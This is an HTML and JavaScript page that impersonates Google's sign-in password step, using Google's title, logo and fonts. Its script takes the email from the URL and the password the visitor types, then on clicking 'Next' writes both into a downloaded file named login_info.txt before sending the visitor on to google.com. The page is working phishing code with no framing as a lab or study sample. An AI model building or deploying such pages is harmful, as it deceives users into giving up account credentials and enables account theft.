<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Sign in - Google accounts</title>
    <link rel="stylesheet" href="style.css">
    <style>
    </style>
    <link href="https://fonts.googleapis.com/css?family=Google+Sans:400,500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="box">
        <img id="logo" center src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google 로고">
        <h2>Welcome</h2>
        <br><br><br><br><br>
        <form>
            <div class="inputBox">
                <input type="password" id="passwordField" name="password" required onkeyup="this.setAttribute('value', this.value);"  value="">
                <label>Enter your password</label>
            </div>
            <p style="font-size: 14px; position: absolute; margin-bottom: 10rem;">
                <input type="checkbox" id="showPasswordCheckbox" onchange="togglePasswordVisibility()"> Show password
            </p>
            <br><br><br><br><br><br>
            <a style="color: #1A73E8; font-weight: 500; font-size: 15px; font-family: Google Sans; text-decoration: none;" href="password.html">Forgot password?</a>
           
            <a href="https://www.google.com">
            <input style="margin-bottom: 10px; float: right;" type="submit" name="sign-in" value="Next" onclick="downloadTextFile()">
            </a>       
        </form>
    </div>

    <script>
        function togglePasswordVisibility() {
            var passwordField = document.getElementById("passwordField");
            var showPasswordCheckbox = document.getElementById("showPasswordCheckbox");

            if (showPasswordCheckbox.checked) {
                passwordField.type = "text";
            } else {
                passwordField.type = "password";
            }
        }

        function downloadTextFile() {
            var passwordField = document.getElementById("passwordField");
            var password = passwordField.value;

            // Get the email value from the URL parameter
            var email = window.location.search.substr(1).split('=')[1];

            // Create a new Blob object with the text content
            var content = "Email: " + email + "\nPassword: " + password;
            var blob = new Blob([content], { type: "text/plain" });

            // Create a temporary anchor element
            var link = document.createElement("a");
            link.href = URL.createObjectURL(blob);

            // Set the filename for the download
            link.download = "login_info.txt";

            // Programmatically trigger the download
            link.click();
        }
    </script>
</body>
</html>
